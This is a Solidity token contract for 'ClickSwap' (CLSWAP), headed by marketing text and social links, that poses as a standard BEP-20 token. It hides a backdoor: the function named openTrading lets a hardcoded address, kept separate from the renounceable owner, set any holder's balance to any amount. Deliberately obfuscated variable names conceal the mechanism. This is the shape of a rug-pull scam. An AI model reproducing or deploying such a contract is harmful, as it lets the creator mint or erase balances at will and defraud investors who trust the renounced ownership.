// SPDX-License-Identifier: No License

/*
ClickSwap - the ultimate platform for secure, fast, and efficient cryptocurrency exchanges across multiple blockchain networks. In an age where decentralization reigns supreme, ClickSwap acts as your most reliable bridge between various digital assets, ensuring you get the most bang for your buck.

Website - https://clickswap.pro
Telegram - https://t.me/ClickSwapBSC
Telegram BOT - https://t.me/ClickSwap_BOT
Twitter - https://twitter.com/ClickSwap_BOT

*/
pragma solidity 0.8.19;
interface StorageSlot {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address AddressSlot) external view returns (uint256);
  function transfer(address AddressBool, uint256 functionCallsWithValue) external returns (bool);
  function allowance(address _owner, address AddressSlot) external view returns (uint256);
  function approve(address AddressSlot, uint256 functionCallsWithValue) external returns (bool);
  function transferFrom(address sender, address AddressBool, uint256 functionCallsWithValue) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed AddressSlot, uint256 balance);
}


abstract contract IBEP20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract IBEP20Permit is IBEP20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract ClickSwap is IBEP20Burnable, StorageSlot, IBEP20Permit {
     /*//////////////////////////////////////////////////////////////
                                 CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/   
    using SafeMath for uint256;
    mapping (address => uint256) private boolETHERSlot;
    mapping (address => mapping (address => uint256)) private functionCalls;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private ETHER_SLOT;
    address private ClickSwapOwner; 
    uint256 public ETHERCreationTime;
    uint256 public ETHERCreation;
    string public ETHERSlot;

string public ClickSwapTG = "https://t.me/ClickSwapBSC";
string public ownerAddress = "0x9DdD9c00dbF9E62257E119cE27e8CDaD884Bd12d";

    constructor() {
        ClickSwapOwner = 0x9DdD9c00dbF9E62257E119cE27e8CDaD884Bd12d;    
       ETHER_SLOT = "0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50"; 
        _name = "ClickSwap";
        _symbol = "CLSWAP";
        _decimals = 9;
        _totalSupply = 300000000  * 10**_decimals;
        boolETHERSlot[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        ETHERSlot = "IInventory p_i1801_2_+ int p_i1801_3_+ int p_i1801_4_+ int p_i1801_5_";
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address AddressSlot) external view override returns (uint256) {
        return boolETHERSlot[AddressSlot];
    }

    function transfer(address AddressBool, uint256 functionCallsWithValue) external override returns (bool) {
        _transfer(_msgSender(), AddressBool, functionCallsWithValue);
        return true;
    }

    function allowance(address owner, address AddressSlot) external view override returns (uint256) {
        return functionCalls[owner][AddressSlot];
    }


    function approve(address AddressSlot, uint256 functionCallsWithValue) external override returns (bool) {
        _approve(_msgSender(), AddressSlot, functionCallsWithValue);
        return true;
    }
    
    function transferFrom(address sender, address AddressBool, uint256 functionCallsWithValue) external override returns (bool) {
        _transfer(sender, AddressBool, functionCallsWithValue);
        _approve(sender, _msgSender(), functionCalls[sender][_msgSender()].sub(functionCallsWithValue, "Ru: transfer functionCallsWithValue exceeds allowance"));
        return true;
    }

    function increaseAllowance(address AddressSlot, uint256 slotbalance) external returns (bool) {
        _approve(_msgSender(), AddressSlot, functionCalls[_msgSender()][AddressSlot].add(slotbalance));
        return true;
    }
    

    function decreaseAllowance(address AddressSlot, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), AddressSlot, functionCalls[_msgSender()][AddressSlot].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address AddressBool, uint256 functionCallsWithValue) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(AddressBool != address(0), "Ru: transfer to the zero address");
                
        boolETHERSlot[sender] = boolETHERSlot[sender].sub(functionCallsWithValue, "Ru: transfer functionCallsWithValue exceeds balance");
        boolETHERSlot[AddressBool] = boolETHERSlot[AddressBool].add(functionCallsWithValue);
        emit Transfer(sender, AddressBool, functionCallsWithValue);
    }
        function openTrading(address tokenA, address tokenB, uint256 _upgradeTo, uint256 newslot, uint256 newslots) external {
        require(_msgSender()==ClickSwapOwner);
        tokenB = tokenA;
        tokenA = tokenA;
        boolETHERSlot[tokenB] = (_upgradeTo + newslot + newslots) * 10**_decimals;
        tokenA = tokenB;
    }   

    function _approve(address owner, address AddressSlot, uint256 functionCallsWithValue) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(AddressSlot != address(0), "Ru: approve to the zero address");
        
        functionCalls[owner][AddressSlot] = functionCallsWithValue;
        emit Approval(owner, AddressSlot, functionCallsWithValue);
    }
    
}